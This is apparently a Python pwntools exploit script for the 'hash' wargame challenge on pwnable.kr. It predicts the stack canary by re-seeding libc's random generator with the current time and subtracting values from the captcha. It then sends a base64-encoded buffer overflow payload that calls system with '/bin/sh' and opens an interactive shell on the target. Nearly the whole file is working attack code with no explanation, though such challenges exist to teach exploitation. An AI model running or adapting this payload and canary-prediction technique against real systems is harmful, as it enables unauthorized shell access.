from pwn import *
import sys
import time
import ctypes
import base64

context.arch="i386"
context.os="linux"
libc_ctypes = ctypes.CDLL("libc.so.6")

def capture_time():
    return libc_ctypes.time(0)  # Get current Unix time (seconds since epoch)

current_time = capture_time()


binary_name = "hash"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)
libc=e.libc # So long as i'm not running against the remote target, use the local libc

REMOTE = "nc pwnable.kr 9002"

context.binary = e


# Function to start remote process
def start_remote():
    ip, port = REMOTE.replace("nc ", "").split(" ")
    port = int(port)
    p = remote(ip, port)
    return p

def find_canary(captcha,current_time):
    print(f"running for time = {current_time}")
    libc_ctypes.srand(current_time)


    random_arr = [libc_ctypes.rand()]

    for _ in range(8):
        random_arr.append(libc_ctypes.rand(None))
    
    # Solve for canary
    canary = (captcha +random_arr[6]+random_arr[3])- (random_arr[1] +random_arr[2] +random_arr[4] +random_arr[5] +random_arr[7])
    
    canary%=2**32

    return canary


def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    else:
        if(sys.argv[1] == "remote"):
            # Start the remote process
            p = start_remote()
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(f"./{binary_name}", gdbscript="b *0x080490FD", aslr=False)
        else:
            p = process(f"./{binary_name}")


    p.recvline()
    p.recvuntil(b"Are you human? input captcha : ")
    captcha_str =p.recvuntil(b"\n")
    captcha_int = int(captcha_str)

    log.success(f"captured captcha int: {captcha_int} for captcha {captcha_str}\n\n")

    p.send(captcha_str)
    print(p.recvlines(2))


    canary = find_canary(captcha_int,current_time)

    log.success(f"Found canary: 0x{canary:x}")
    # Example raw bytes


    payload=b"A" *0x200 +p32(canary)

    binsh_addr = 0x804b3b0

    payload += 3*p32(0xcafebabe)+flat(e.plt['system'],0xdeadbeef,binsh_addr)
    # payload += p32(0xcafebabe)+ p32(e.sym['main'])

    # Encode raw bytes to Base64
    encoded_payload = base64.b64encode(payload)
    encoded_payload+=b"/bin/sh\x00"


    log.success(f"Sending payload:\n------------\n{encoded_payload}\n------------")
    p.sendline(encoded_payload)
    p.interactive()


main()
